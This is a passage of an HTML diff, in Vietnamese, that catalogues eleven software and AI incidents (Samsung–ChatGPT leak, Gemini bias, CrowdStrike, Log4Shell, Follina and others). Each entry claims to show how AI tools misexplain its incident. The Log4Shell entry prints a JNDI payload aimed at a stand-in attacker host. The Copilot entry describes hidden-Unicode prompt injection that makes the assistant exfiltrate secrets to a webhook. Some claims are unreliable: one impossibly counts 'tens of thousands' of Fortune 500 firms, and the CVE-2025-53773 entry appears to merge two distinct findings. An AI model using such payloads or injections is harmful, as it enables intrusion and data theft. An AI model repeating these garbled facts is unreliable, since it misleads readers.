+<li><strong>Phân tích:</strong> Khi được yêu cầu giải thích sự cố này, AI thường bịa ra nguyên nhân là "lỗ hổng vượt qua lớp xác thực API" (API authentication bypass) hoặc "tin tặc tấn công SQL Injection vào máy chủ OpenAI", thay vì nêu đúng bản chất kỹ thuật là lỗi tương tranh bộ nhớ đệm (race condition) trong thư viện Redis client bên thứ ba.</li>
+</ul>
+<hr />
+<h3>DEFECT-02 — AI/LLM: Samsung Semiconductor / ChatGPT Corporate Data Leak</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> Samsung Electronics / OpenAI ChatGPT</li>
+<li><strong>Phiên bản:</strong> ChatGPT (GPT-3.5, 2023)</li>
+<li><strong>Ngày công bố:</strong> Tháng 04/2023</li>
+<li><strong>Nguồn:</strong> Forbes / The Economist / Báo cáo nội bộ Samsung</li>
+<li><strong>URL:</strong> <a href="https://www.forbes.com/sites/siladityaray/2023/05/02/samsung-bans-chatgpt-and-other-ai-chatbots-for-employees-after-sensitive-code-leak/">https://www.forbes.com/sites/siladityaray/2023/05/02/samsung-bans-chatgpt-and-other-ai-chatbots-for-employees-after-sensitive-code-leak/</a></li>
+<li><strong>Phân loại:</strong> AI Data Privacy / Corporate Data Leak</li>
+<li><strong>Mức độ nghiêm trọng:</strong> High</li>
+<li><strong>Lý do mức độ:</strong> Rò rỉ mã nguồn phần mềm cơ sở bán dẫn độc quyền, chuỗi đo kiểm vi mạch và biên bản cuộc họp chiến lược bảo mật của Samsung lên máy chủ AI bên thứ ba.</li>
+<li><strong>Mô tả sự cố:</strong> Nhân viên thuộc bộ phận bán dẫn của Samsung đã 3 lần đưa dữ liệu mật lên ChatGPT: (1) kỹ sư dán mã nguồn kiểm thử vi mạch để nhờ AI debug, (2) kỹ sư tải lên chuỗi lệnh tối ưu hóa năng suất bán dẫn, (3) một quản lý dán toàn bộ biên bản ghi âm cuộc họp điều hành để nhờ AI tóm tắt. Toàn bộ dữ liệu này được lưu trữ và có thể được dùng để tái huấn luyện mô hình của OpenAI.</li>
+<li><strong>Hậu quả:</strong> Nguy cơ thất thoát bí mật công nghệ bán dẫn cốt lõi; Samsung lập tức ban hành lệnh cấm toàn bộ nhân viên sử dụng các công cụ GenAI công cộng trên thiết bị công ty.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Bộ phận bán dẫn Samsung Electronics (Samsung Semiconductor Division).</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Thiếu chính sách quản trị sử dụng AI nội bộ (AI Governance) và nhân viên chưa hiểu rõ điều khoản lưu trữ dữ liệu (Data Retention) của các dịch vụ LLM công cộng.</li>
+<li><strong>Giải pháp (Solution):</strong> Ban hành lệnh cấm sử dụng AI công cộng; phối hợp xây dựng hệ thống AI nội bộ chạy trên máy chủ riêng biệt (On-premise Private AI).</li>
+<li><strong>Tình trạng:</strong> Khắc phục bằng chính sách quản trị (Tháng 05/2023).</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> AI Hallucination / Omission</li>
+<li><strong>Phân tích:</strong> AI khi tóm tắt sự cố này thường mô tả vụ việc như một vụ "máy chủ OpenAI bị tin tặc tấn công để đánh cắp mã nguồn Samsung", làm lệch lạc bản chất sự việc từ một lỗi vi phạm chính sách nội bộ của con người thành một cuộc tấn công an ninh mạng từ bên ngoài.</li>
+</ul>
+<hr />
+<h3>DEFECT-03 — AI/LLM: Google Gemini (Formerly Bard) — Diversity Overcorrection Bias</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> Google Gemini (Mô hình tạo ảnh Imagen 2 / Gemini 1.0 Pro)</li>
+<li><strong>Phiên bản:</strong> Gemini (Tháng 02/2024)</li>
+<li><strong>Ngày công bố:</strong> Tháng 02/2024</li>
+<li><strong>Nguồn:</strong> Axios / BBC News / Thông cáo chính thức của CEO Sundar Pichai</li>
+<li><strong>URL:</strong> <a href="https://www.axios.com/2024/02/28/ai-software-bugs-google-gemini-att">https://www.axios.com/2024/02/28/ai-software-bugs-google-gemini-att</a></li>
+<li><strong>Phân loại:</strong> AI Bias / Algorithmic Diversity Overcorrection</li>
+<li><strong>Mức độ nghiêm trọng:</strong> High</li>
+<li><strong>Lý do mức độ:</strong> Gây tổn hại nghiêm trọng đến uy tín thương hiệu của Google; đưa ra các kết quả sai lệch lịch sử nghiêm trọng; CEO Sundar Pichai phải công khai thừa nhận sự cố là "hoàn toàn không thể chấp nhận được".</li>
+<li><strong>Mô tả sự cố:</strong> Khi người dùng nhập các câu lệnh yêu cầu tạo hình ảnh nhân vật lịch sử cụ thể (ví dụ: "những người sáng lập nước Mỹ năm 1789", "binh lính Đức thời Thế chiến 2", "Giáo hoàng La Mã thế kỷ 16"), Gemini liên tục sinh ra hình ảnh mang tính đa dạng chủng tộc thái quá (như phụ nữ da màu trong trang phục lính phát xít Đức, hay người bản địa châu Mỹ là thành viên lập quốc Hoa Kỳ).</li>
+<li><strong>Hậu quả:</strong> Google buộc phải tạm dừng khẩn cấp toàn bộ tính năng tạo hình ảnh người của Gemini trên phạm vi toàn cầu; giá cổ phiếu Alphabet sụt giảm và uy tín nghiên cứu AI bị ảnh hưởng nặng nề.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Toàn bộ người dùng sử dụng tính năng tạo ảnh của Google Gemini trên thế giới.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Thiên kiến do điều chỉnh thuật toán quá đà (Diversity Overcorrection): Hệ thống tự động chèn thêm các từ khóa về đa dạng chủng tộc/giới tính vào prompt ngầm mà không có cơ chế ràng buộc ngữ cảnh lịch sử thực tế.</li>
+<li><strong>Giải pháp (Solution):</strong> Tạm dừng tạo ảnh người, tinh chỉnh lại bộ tiền xử lý prompt, tăng cường kiểm thử red-teaming cho các chủ đề lịch sử nhạy cảm trước khi mở lại.</li>
+<li><strong>Tình trạng:</strong> Tạm dừng và cập nhật bản vá bộ lọc (Tháng 03/2024).</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> AI Bias (Confirmed) / Self-Defending Bias</li>
+<li><strong>Phân tích:</strong> Bản thân sự cố này là một minh chứng sống về thiên kiến của AI. Đáng chú ý, khi được hỏi về chính sự cố này, một số chatbot AI có xu hướng bào chữa, cho rằng hệ thống "chỉ đang cố gắng thúc đẩy sự bình đẳng và hòa nhập", né tránh việc thừa nhận đây là một lỗi kỹ thuật kiểm thử nghiêm trọng làm sai lệch sự thật lịch sử.</li>
+</ul>
+<hr />
+<h3>DEFECT-04 — AI/LLM: Microsoft Copilot Designer Content Safety Filter Bypass</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> Microsoft Copilot Designer (DALL-E 3 Integration)</li>
+<li><strong>Phiên bản:</strong> Copilot Designer (Giai đoạn 2023–2024)</li>
+<li><strong>Ngày công bố:</strong> Tháng 12/2023 – Tháng 03/2024</li>
+<li><strong>Nguồn:</strong> Báo cáo Red-team của kỹ sư Shane Jones / Tech.co / CNBC</li>
+<li><strong>URL:</strong> <a href="https://tech.co/news/list-ai-failures-mistakes-errors">https://tech.co/news/list-ai-failures-mistakes-errors</a></li>
+<li><strong>Phân loại:</strong> AI Content Safety Failure / Adversarial Bypass</li>
+<li><strong>Mức độ nghiêm trọng:</strong> High</li>
+<li><strong>Lý do mức độ:</strong> Bộ lọc an toàn bị vượt qua cho phép tạo ra các hình ảnh bạo lực, tình dục hóa trẻ vị thành niên và tiêu thụ chất kích thích, vi phạm trực tiếp các cam kết an toàn AI của Microsoft.</li>
+<li><strong>Mô tả sự cố:</strong> Kỹ sư Shane Jones của Microsoft phát hiện ra rằng bằng cách sử dụng các kỹ thuật cấu trúc prompt đối kháng cơ bản (adversarial prompting), Copilot Designer dễ dàng bị đánh lừa để tạo ra các hình ảnh nhạy cảm có mặt trẻ em, bạo lực máu me và vi phạm bản quyền thương hiệu hàng loạt mà bộ lọc kiểm duyệt không hề phát hiện.</li>
+<li><strong>Hậu quả:</strong> Kỹ sư phải gửi thư cảnh báo lên Ủy ban Thương mại Liên bang Hoa Kỳ (FTC) và ban giám đốc; Microsoft phải triển khai các bản vá nóng bổ sung cho bộ lọc ngôn ngữ và hình ảnh.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Hàng triệu người dùng Copilot Designer trên nền tảng web và Windows.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Bộ lọc an toàn (Safety Guardrails) chỉ so khớp từ khóa tĩnh đơn giản, thiếu khả năng phân tích ngữ nghĩa sâu đối với các prompt chứa ẩn ý hoặc từ ngữ né tránh (jailbreak semantics).</li>
+<li><strong>Giải pháp (Solution):</strong> Nâng cấp hệ thống Azure AI Content Safety, bổ sung bộ phân loại intent đa tầng và chặn các mẫu câu đối kháng.</li>
+<li><strong>Tình trạng:</strong> Đã cập nhật nhiều lớp kiểm duyệt (Đầu 2024).</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> AI Minimization / Hallucination of Safety</li>
+<li><strong>Phân tích:</strong> Khi phân tích sự cố này, các mô hình AI thường giảm nhẹ mức độ nghiêm trọng bằng cách tuyên bố rằng "lỗi này chỉ xuất hiện khi người dùng cố tình bẻ khóa phức tạp", cố tình bỏ qua thực tế rằng các câu lệnh của kỹ sư gửi lên FTC hoàn toàn là ngôn ngữ tự nhiên thông thường và bộ lọc đã thất bại ngay ở các trường hợp biên cơ bản.</li>
+</ul>
+<hr />
+<h3>DEFECT-05 — AI/LLM: GitHub Copilot Invisible Prompt Injection (CVE-2025-53773 / CamoLeak)</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> GitHub Copilot / VS Code Extension</li>
+<li><strong>Phiên bản:</strong> GitHub Copilot (Bản phát hành trước tháng 06/2025)</li>
+<li><strong>Ngày công bố:</strong> Tháng 06/2025</li>
+<li><strong>Nguồn:</strong> Cycode Research / NVD Security Advisory</li>
+<li><strong>URL:</strong> <a href="https://cycode.com/blog/ai-security-vulnerabilities/">https://cycode.com/blog/ai-security-vulnerabilities/</a></li>
+<li><strong>Phân loại:</strong> AI Security Vulnerability / Prompt Injection / Data Exfiltration</li>
+<li><strong>Mức độ nghiêm trọng:</strong> Critical</li>
+<li><strong>Lý do mức độ:</strong> Điểm CVSS 9.6; cho phép kẻ tấn công trích xuất ngầm các khóa bí mật (API keys, credentials) và mã nguồn của lập trình viên mà không để lại bất kỳ dấu vết trực quan nào.</li>
+<li><strong>Mô tả sự cố:</strong> Lỗ hổng có tên "CamoLeak" tận dụng các ký tự điều khiển định hướng văn bản Unicode vô hình (như ký tự ẩn Right-to-Left Override) được chèn vào phần mô tả của Pull Request hoặc comment mã nguồn. Khi lập trình viên yêu cầu Copilot tóm tắt hoặc review PR, mô hình LLM sẽ đọc các chỉ dẫn ẩn này và tự động gửi mã nguồn hoặc token môi trường ra một webhook do kẻ tấn công chỉ định.</li>
+<li><strong>Hậu quả:</strong> Nguy cơ rò rỉ mã nguồn độc quyền của hàng ngàn dự án phần mềm sử dụng Copilot; các lập trình viên hoàn toàn không thấy chỉ dẫn độc hại vì các ký tự này vô hình trên giao diện hiển thị.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Tất cả người dùng GitHub Copilot tích hợp trong IDE tham gia review các kho lưu trữ công cộng.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Hệ thống không thực hiện lọc và chuẩn hóa (sanitization) các ký tự điều khiển Unicode vô hình trước khi đưa dữ liệu vào cửa sổ ngữ cảnh (Context Window) của LLM.</li>
+<li><strong>Giải pháp (Solution):</strong> GitHub tung bản vá lọc bỏ toàn bộ các ký tự Unicode vô hình trước khi nạp vào prompt của mô hình, đồng thời giới hạn quyền gọi kết nối ra mạng ngoài của Copilot Extension.</li>
+<li><strong>Tình trạng:</strong> Đã vá (2025).</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> AI Hallucination / Misclassification</li>
+<li><strong>Phân tích:</strong> Khi yêu cầu AI giải thích về CVE-2025-53773, AI thường nhầm lẫn xếp lỗ hổng này vào nhóm "tấn công XSS qua trình duyệt thông thường" thay vì nhận diện đúng đây là hình thức tấn công Prompt Injection nhắm vào LLM context thông qua kỹ thuật Unicode Steganography.</li>
+</ul>
+<hr />
+<h3>DEFECT-06 — CrowdStrike Falcon Sensor Kernel Crash &amp; Global Windows BSOD Outage</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> CrowdStrike Falcon Sensor / Microsoft Windows</li>
+<li><strong>Phiên bản:</strong> Falcon Sensor (Channel File 291, cập nhật ngày 19/07/2024)</li>
+<li><strong>Ngày công bố:</strong> 19/07/2024</li>
+<li><strong>Nguồn:</strong> Báo cáo đánh giá sự cố sơ bộ của CrowdStrike (PIR) / Wikipedia</li>
+<li><strong>URL:</strong> <a href="https://en.wikipedia.org/wiki/2024_CrowdStrike-related_IT_outages">https://en.wikipedia.org/wiki/2024_CrowdStrike-related_IT_outages</a></li>
+<li><strong>Phân loại:</strong> Software Update Defect / Memory Out-of-bounds Read / Testing Pipeline Failure</li>
+<li><strong>Mức độ nghiêm trọng:</strong> Critical</li>
+<li><strong>Lý do mức độ:</strong> Làm tê liệt 8.5 triệu máy tính và máy chủ Windows toàn cầu; được coi là sự cố gián đoạn CNTT lớn nhất lịch sử nhân loại; thiệt hại ước tính vượt 10 tỷ USD.</li>
+<li><strong>Mô tả sự cố:</strong> CrowdStrike phát hành bản cập nhật tệp cấu hình Channel File 291 nhằm đo kiểm luồng IPC độc hại. Tệp này chứa 21 trường dữ liệu đầu vào trong khi bộ thông dịch (Content Interpreter) trong kernel driver của Falcon Sensor chỉ phân bổ bộ đệm cho 20 trường. Trình kiểm tra nội dung (Content Validator) của CrowdStrike bị lỗi logic nên đã cho phép tệp cấu hình lỗi vượt qua khâu kiểm thử tự động, gây ra lỗi đọc bộ nhớ ngoài giới hạn (out-of-bounds memory read), lập tức kích hoạt màn hình xanh chết chóc (BSOD) trên hàng triệu máy tính.</li>
+<li><strong>Hậu quả:</strong> 8.5 triệu hệ thống Windows bị sập hoàn toàn; hơn 5,000 chuyến bay bị hủy; hệ thống y tế Anh (NHS) tê liệt phòng khám; các ngân hàng và sàn chứng khoán ngừng giao dịch.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Hàng chục ngàn doanh nghiệp trong danh sách Fortune 500 sử dụng Windows và CrowdStrike Falcon.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Lỗi logic trong hệ thống kiểm định nội dung (Content Validator); thiếu cơ chế kiểm tra biên mảng trong driver kernel; quy trình triển khai không phân tầng (canary deployment) mà đẩy đồng loạt ra toàn cầu.</li>
+<li><strong>Giải pháp (Solution):</strong> Thu hồi tệp Channel File 291; hướng dẫn quản trị viên khởi động vào Safe Mode để xóa tệp lỗi thủ công; nâng cấp hệ thống Content Validator và áp dụng quy tắc triển khai theo từng đợt (staged rollout).</li>
+<li><strong>Tình trạng:</strong> Đã khắc phục (Cuối tháng 07/2024). Hãng Delta Air Lines đang khởi kiện đòi bồi thường hơn 500 triệu USD.</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> Omission / Misattribution</li>
+<li><strong>Phân tích:</strong> Rất nhiều công cụ AI khi được hỏi về sự cố này đã quy kết nguyên nhân là do "lỗi bảo mật trong hệ điều hành Windows của Microsoft", bỏ qua chi tiết cốt lõi rằng lỗi hoàn toàn nằm ở phần mềm kiểm thử nội dung tự động của CrowdStrike và việc vi phạm nguyên tắc kiểm tra biên bộ nhớ (bounds checking) trong driver của bên thứ ba.</li>
+</ul>
+<hr />
+<h3>DEFECT-07 — Apache Log4j 2 Remote Code Execution (Log4Shell - CVE-2021-44228)</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> Apache Log4j 2</li>
+<li><strong>Phiên bản:</strong> Log4j phiên bản 2.0-beta9 đến 2.14.1</li>
+<li><strong>Ngày công bố:</strong> 09/12/2021 (Đợt khai thác trên diện rộng kéo dài suốt 2022–2023)</li>
+<li><strong>Nguồn:</strong> National Vulnerability Database (NVD) / Apache Security Advisory</li>
+<li><strong>URL:</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">https://nvd.nist.gov/vuln/detail/CVE-2021-44228</a></li>
+<li><strong>Phân loại:</strong> Security Vulnerability / Remote Code Execution (RCE)</li>
+<li><strong>Mức độ nghiêm trọng:</strong> Critical</li>
+<li><strong>Lý do mức độ:</strong> Điểm CVSS 10.0 (tuyệt đối); cho phép thực thi mã từ xa không cần xác thực trên hàng triệu máy chủ Java trên toàn cầu.</li>
+<li><strong>Mô tả sự cố:</strong> Tính năng tra cứu JNDI (Java Naming and Directory Interface) trong Log4j 2 tự động phân giải và tải về các đối tượng Java từ các máy chủ LDAP/RMI từ xa mà không có cơ chế lọc dữ liệu. Kẻ tấn công chỉ cần gửi một chuỗi văn bản dạng <code>${jndi:ldap://attacker.com/exploit}</code> vào bất kỳ trường nào được ghi vào log (User-Agent, ô tìm kiếm...) là có thể chiếm toàn quyền điều khiển máy chủ.</li>
+<li><strong>Hậu quả:</strong> Hàng triệu máy chủ của Apple, Amazon, Cloudflare, Tesla và các cơ quan chính phủ bị đe dọa; các chiến dịch tấn công cài mã độc đào tiền ảo và mã độc tống tiền khai thác liên tục trong nhiều năm.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Hầu hết mọi ứng dụng Java doanh nghiệp sử dụng Log4j 2 trên thế giới.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Thiết kế tính năng cho phép thực thi mã động qua giao thức mạng ngoài theo mặc định mà không lọc dữ liệu đầu vào.</li>
+<li><strong>Giải pháp (Solution):</strong> Apache phát hành bản vá khẩn cấp Log4j 2.15.0, sau đó là 2.16.0 và 2.17.1 vô hiệu hóa hoàn toàn JNDI theo mặc định và loại bỏ hỗ trợ message lookups.</li>
+<li><strong>Tình trạng:</strong> Đã vá (2022). Tuy nhiên các hệ thống cũ chưa nâng cấp vẫn tiếp tục bị tấn công.</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> Unsupported Claim / Understatement</li>
+<li><strong>Phân tích:</strong> AI thường tuyên bố rằng Log4Shell "đã được xử lý triệt để ngay sau khi phát hành bản vá vào tháng 12/2021", phủ nhận thực tế các báo cáo an ninh mạng năm 2022–2023 cho thấy hàng chục ngàn máy chủ doanh nghiệp vẫn tiếp tục bị khai thác do chu kỳ vá lỗi trong các hệ sinh thái phần mềm kế thừa (legacy software) diễn ra vô cùng chậm chạp.</li>
+</ul>
+<hr />
+<h3>DEFECT-08 — Spring Framework Remote Code Execution (Spring4Shell - CVE-2022-22965)</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> Spring Framework (Spring MVC &amp; Spring WebFlux)</li>
+<li><strong>Phiên bản:</strong> Spring Framework 5.3.0 đến 5.3.17, 5.2.0 đến 5.2.19</li>
+<li><strong>Ngày công bố:</strong> 31/03/2022</li>
+<li><strong>Nguồn:</strong> VMware Spring Security Advisory / NVD</li>
+<li><strong>URL:</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22965">https://nvd.nist.gov/vuln/detail/CVE-2022-22965</a></li>
+<li><strong>Phân loại:</strong> Security Vulnerability / Remote Code Execution</li>
+<li><strong>Mức độ nghiêm trọng:</strong> Critical</li>
+<li><strong>Lý do mức độ:</strong> Điểm CVSS 9.8; lỗ hổng RCE không cần xác thực nhắm vào framework ứng dụng web phổ biến nhất thế giới trong hệ sinh thái Java.</li>
+<li><strong>Mô tả sự cố:</strong> Cơ chế ràng buộc dữ liệu (Data Binding) trong Spring MVC cho phép người dùng ánh xạ các tham số HTTP request trực tiếp vào các thuộc tính của Java object. Khi chạy trên JDK 9+ với máy chủ Tomcat (đóng gói dưới dạng file WAR truyền thống), kẻ tấn công có thể thông qua class loader để ghi đè cấu hình ghi log của Tomcat, từ đó tạo ra một file Webshell (JSP) độc hại trên máy chủ để thực thi lệnh từ xa.</li>
+<li><strong>Hậu quả:</strong> Hàng ngàn ứng dụng ngân hàng, thương mại điện tử chạy nền tảng Spring bị nhắm mục tiêu tấn công ngay trong những giờ đầu tiên công bố mã khai thác (PoC).</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Các ứng dụng Spring MVC/WebFlux chạy trên JDK 9 trở lên đóng gói dưới dạng Tomcat WAR.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Quá trình lọc các thuộc tính Class Loader trong cơ chế JavaBean Data Binding của Spring bị hở khi Java nâng cấp lên module system ở JDK 9.</li>
+<li><strong>Giải pháp (Solution):</strong> Nâng cấp lên Spring Framework phiên bản 5.3.18 hoặc 5.2.20; áp dụng quy tắc chặn tham số <code>class.*</code> trên Web Application Firewall (WAF).</li>
+<li><strong>Tình trạng:</strong> Đã vá (Tháng 04/2022).</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> Hallucination / Conflation</li>
+<li><strong>Phân tích:</strong> AI rất hay bị ảo giác nhầm lẫn giữa Spring4Shell và Log4Shell, khẳng định rằng Spring4Shell là "lỗi ghi log bằng JNDI", trong khi thực tế lỗ hổng này hoàn toàn nằm ở tầng Data Binding và Class Loader reflection của framework ứng dụng web.</li>
+</ul>
+<hr />
+<h3>DEFECT-09 — Atlassian Confluence Server OGNL Injection (CVE-2022-26134)</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> Atlassian Confluence Server &amp; Data Center</li>
+<li><strong>Phiên bản:</strong> Mọi phiên bản trước 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, 7.18.1</li>
+<li><strong>Ngày công bố:</strong> 03/06/2022</li>
+<li><strong>Nguồn:</strong> Atlassian Security Advisory / Volexity Research</li>
+<li><strong>URL:</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-26134">https://nvd.nist.gov/vuln/detail/CVE-2022-26134</a></li>
+<li><strong>Phân loại:</strong> Security Vulnerability / OGNL Injection / RCE</li>
+<li><strong>Mức độ nghiêm trọng:</strong> Critical</li>
+<li><strong>Lý do mức độ:</strong> Điểm CVSS 9.8; bị khai thác zero-day trong thực tế trước khi hãng kịp phát hành bản vá; cho phép chiếm quyền máy chủ mà không cần đăng nhập.</li>
+<li><strong>Mô tả sự cố:</strong> Một lỗ hổng chèn biểu thức OGNL (Object-Graph Navigation Language) trong URL của Confluence cho phép kẻ tấn công gửi một HTTP GET request chứa mã OGNL độc hại trong đường dẫn URI. Khi máy chủ Confluence xử lý trang chuyển hướng hoặc lỗi, biểu thức này được thực thi trực tiếp dưới quyền của tài khoản chạy dịch vụ.</li>
+<li><strong>Hậu quả:</strong> Hàng ngàn máy chủ tài liệu nội bộ của các tập đoàn công nghệ lớn bị cài đặt Webshell, đánh cắp mã nguồn và triển khai mã độc mã hóa dữ liệu.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Hàng chục ngàn doanh nghiệp triển khai Confluence On-premise trên toàn cầu.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Thiếu cơ chế kiểm tra và làm sạch (sanitization) chuỗi URI trước khi truyền vào engine xử lý biểu thức OGNL.</li>
+<li><strong>Giải pháp (Solution):</strong> Nâng cấp khẩn cấp các phiên bản vá lỗi của Atlassian; tạm thời chặn các request chứa ký tự đặc biệt bằng WAF.</li>
+<li><strong>Tình trạng:</strong> Đã vá (Tháng 06/2022).</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> Omission of Zero-Day Window</li>
+<li><strong>Phân tích:</strong> Khi được hỏi, AI thường bỏ qua chi tiết quan trọng rằng lỗ hổng này đã bị các nhóm tin tặc khai thác bí mật trên diện rộng từ trước khi Atlassian nhận được báo cáo (zero-day exploitation), làm cho người đọc đánh giá sai mức độ khẩn cấp và độ trễ trong quy trình phản ứng sự cố của hãng.</li>
+</ul>
+<hr />
+<h3>DEFECT-10 — Microsoft Windows MSDT "Follina" Zero-Day (CVE-2022-30190)</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> Microsoft Windows Support Diagnostic Tool (MSDT) / Microsoft Office</li>
+<li><strong>Phiên bản:</strong> Windows 7 đến Windows 11, Windows Server 2008 đến 2022</li>
+<li><strong>Ngày công bố:</strong> 30/05/2022</li>
+<li><strong>Nguồn:</strong> Microsoft Security Advisory / NVD</li>
+<li><strong>URL:</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-30190">https://nvd.nist.gov/vuln/detail/CVE-2022-30190</a></li>
+<li><strong>Phân loại:</strong> Security Vulnerability / Zero-Day RCE</li>
+<li><strong>Mức độ nghiêm trọng:</strong> High</li>
+<li><strong>Lý do mức độ:</strong> Điểm CVSS 7.8; cho phép thực thi mã từ xa qua file Word độc hại mà không cần nạn nhân phải bật macro (macro-less exploit).</li>
+<li><strong>Mô tả sự cố:</strong> Kẻ tấn công tạo một file tài liệu Microsoft Word có chứa liên kết tải template HTML độc hại từ xa. Trang HTML này sử dụng giao thức URL đặc biệt <code>ms-msdt:</code> để kích hoạt công cụ chẩn đoán hệ thống Windows (MSDT), truyền các tham số tùy ý để thực thi mã lệnh PowerShell độc hại ngay cả khi tính năng Macros đã bị vô hiệu hóa hoàn toàn.</li>
+<li><strong>Hậu quả:</strong> Được các nhóm tin tặc có bảo trợ quốc gia sử dụng để tấn công có chủ đích vào các cơ quan chính phủ, quân sự và tổ chức báo chí quốc tế.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Mọi người dùng máy tính chạy Windows có cài đặt bộ ứng dụng văn phòng Microsoft Office.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Trình xử lý giao thức (protocol handler) của MSDT không kiểm tra tính hợp lệ của tham số lệnh khi được gọi từ các ứng dụng bên ngoài như Word.</li>
+<li><strong>Giải pháp (Solution):</strong> Microsoft phát hành bản vá trong đợt Patch Tuesday tháng 06/2022; giải pháp tình thế là vô hiệu hóa giao thức URL <code>ms-msdt</code> trong Windows Registry.</li>
+<li><strong>Tình trạng:</strong> Đã vá (Tháng 06/2022).</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> Hallucination on Macro Requirement</li>
+<li><strong>Phân tích:</strong> AI giải thích sự cố này thường nói nhầm rằng "người dùng bị lừa bật nút Enable Macros trong Word mới bị nhiễm", ảo giác sang cơ chế tấn công VBA Macro cổ điển, trong khi điểm nguy hiểm nhất làm nên tên tuổi của Follina chính là khả năng thực thi mã mà KHÔNG CẦN bật macro.</li>
+</ul>
+<hr />
+<h3>DEFECT-11 — OpenAI ChatGPT &amp; Developer API Global Outage (11/12/2024)</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> OpenAI ChatGPT / Sora / Developer API</li>
+<li><strong>Phiên bản:</strong> ChatGPT Platform (11/12/2024)</li>
+<li><strong>Ngày công bố:</strong> 11/12/2024</li>
+<li><strong>Nguồn:</strong> Trang trạng thái OpenAI Status / Báo cáo BusinessABC</li>
+<li><strong>URL:</strong> <a href="https://businessabc.net/5-mega-software-disasters-of-2024">https://businessabc.net/5-mega-software-disasters-of-2024</a></li>
+<li><strong>Phân loại:</strong> Service Outage / Infrastructure Misconfiguration</li>
+<li><strong>Mức độ nghiêm trọng:</strong> High</li>
+<li><strong>Lý do mức độ:</strong> Làm gián đoạn dịch vụ ChatGPT, mô hình tạo video Sora và toàn bộ API dành cho lập trình viên trên toàn cầu trong hơn 4 giờ liên tục; ảnh hưởng đến hàng trăm triệu người dùng và các doanh nghiệp tích hợp AI.</li>
+<li><strong>Mô tả sự cố:</strong> Vào ngày 11/12/2024, một bản cập nhật cấu hình hạ tầng mạng nội bộ được đẩy lên môi trường production đã khiến hàng loạt cụm máy chủ xử lý suy luận (inference servers) của OpenAI mất kết nối và không thể định tuyến request, gây ra lỗi HTTP 503/500 trên quy mô toàn cầu.</li>
+<li><strong>Hậu quả:</strong> Hàng triệu nhân viên văn phòng và lập trình viên bị đình trệ công việc; hàng ngàn ứng dụng bên thứ ba (SaaS) tích hợp OpenAI API bị tê liệt tính năng AI; CEO Sam Altman phải công khai xin lỗi trên mạng xã hội X.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Toàn bộ người dùng cá nhân và doanh nghiệp sử dụng ChatGPT và OpenAI API.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Lỗi cấu hình triển khai đồng loạt (misconfiguration) thiếu quy trình kiểm thử rollback tự động trên cụm hạ tầng đám mây.</li>
+<li><strong>Giải pháp (Solution):</strong> Rollback bản cấu hình mạng về trạng thái ổn định trước đó, khởi động lại các cụm gateway và bổ sung các chốt kiểm định an toàn khi cập nhật hạ tầng.</li>
+<li><strong>Tình trạng:</strong> Khắc phục xong sau 4 giờ gián đoạn.</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> Omission of Systemic Downtime Trends</li>
+<li><strong>Phân tích:</strong> Khi phân tích sự cố này, AI thường coi đây là "một sự cố hy hữu đơn lẻ do sự cố mạng thông thường", bỏ qua bức tranh toàn cảnh rằng trong suốt năm 2024 OpenAI đã gặp phải nhiều đợt gián đoạn dịch vụ nghiêm trọng do hạ tầng mở rộng quy mô quá nhanh mà thiếu các bài test tải và test chịu lỗi đồng bộ.</li>
+</ul>
+<hr />
+<h3>DEFECT-12 — Khủng hoảng phần mềm xe điện Volkswagen ID Series (2022–2024)</h3>
+<ul>
